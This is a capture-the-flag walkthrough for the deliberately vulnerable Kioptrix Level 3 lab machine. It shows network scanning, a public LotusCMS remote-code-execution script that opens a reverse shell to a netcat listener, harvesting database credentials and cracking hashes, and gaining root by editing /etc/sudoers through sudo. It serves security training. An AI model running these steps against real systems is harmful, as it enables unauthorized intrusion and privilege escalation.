# Kioptrix Level 3 Walkthrough

# Kioptrix Level 3

## Machine Resolution

### Scanning and Vulnerability Analysis

We start with a scan of our local network with the arp command to obtain the ip of our target machine.
```bash
arp-scan -I eth0 --localnet
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled.png)

Once the ip is obtained we proceed to perform a scan with nmap.
```bash
nmap -sCV 192.168.66.161
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-25 13:37 EDT
Nmap scan report for kioptrix3.com (192.168.66.161)
Host is up (0.0099s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

After scanning with nmap we see that port 80 is open with an http service so let's see what it contains using our browser in this case Firefox and we see the following website.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%201.png)

In the description of the machine tells us to add the domain [kioptrix3.com](http://kioptrix3.com) to our file /etc/hosts to be able to see the web so we open it and add the following:
```bash
192.168.66.161  kioptrix3.com
```

### Exploitation

After surfing the site we can see that the web is made with LotusCMS.
![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%202.png)

So we went to Google to find out if there is any exploit for this CMS and we found the following:

https://github.com/Hood3dRob1n/LotusCMS-Exploit

we clone it to our machine and run

```bash
./lotusRCE.sh kioptrix3.com /

#Enter our ip
192.168.66.152 
#Port
4444
#In another terminal start netcat
nc -nlvp 4444
#select option 1
1
#we have a  shell
nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.66.152] from (UNKNOWN) [192.168.66.161] 38651
whoami
www-data
```

We performed a tty treatment to work more comfortably and to be able to do Ctrl+C.
```bash
script /dev/null -c bash
stty raw –echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows <num> columns <cols>
```

After enumerating for a while we found the file gconfig.php in /home/www/kioptrix3.com/gallery which contains some credentials to the database.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%203.png)

we log into mysql:
```bash
mysql -uroot -pfuckeyou
```

And we obtain the credentials of the admin user but after a few attempts it does not help us to change the user.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%204.png)

We log into phpmyadmin with the credentials obtained previously.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%205.png)

and locate the hashes of the machine's users
![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%206.png)

I have used an online website to crack these hashes by obtaining the password in clear text.

[https://crackstation.net/](https://crackstation.net/)

Dreg

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%207.png)

loneferret

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%208.png)

```bash
dreg:Mast3r
loneferret:starwars
```

Once we have obtained the credentials we connect via SSH but we get an error.


![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%209.png)

To solve it we write the following to connect:

```bash
ssh  -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.66.161
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2010.png)

### Privilege Escalation

If we read the CompanyPolicy.README file it tells us that they have installed new software to edit, create and view files and to use the command "sudo ht".

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2011.png)

With sudo -l we see that we have permissions to run it.

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2012.png)

if we execute it at first we will get an error so we have to execute the following:

```bash
export TERM=xterm
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2013.png)

And run it:

```bash
sudo ht
```

To open a file, use the ALT+ F keys and select the open field:
![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2014.png)

We are going to edit the file /etc/sudoers to be able to launch a shell as root and thus escalate privileges.

To do this, type /etc/sudoers and hit enter.
![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2015.png)

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2016.png)

We add the following command followed by the existing commands to the user loneferret so that he can execute it with sudo.
```bash
, bin/sh
```

![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2017.png)

Press ALT + F to save and exit.
![Untitled](Kioptrix%20Level%203%20a28a8584e1744d7b9cf66aee3b0a2dd4/Untitled%2018.png)

We get a shell as root:
```bash
loneferret@Kioptrix3:~$ sudo sh
# whoami
root
```
Happy Hacking :)

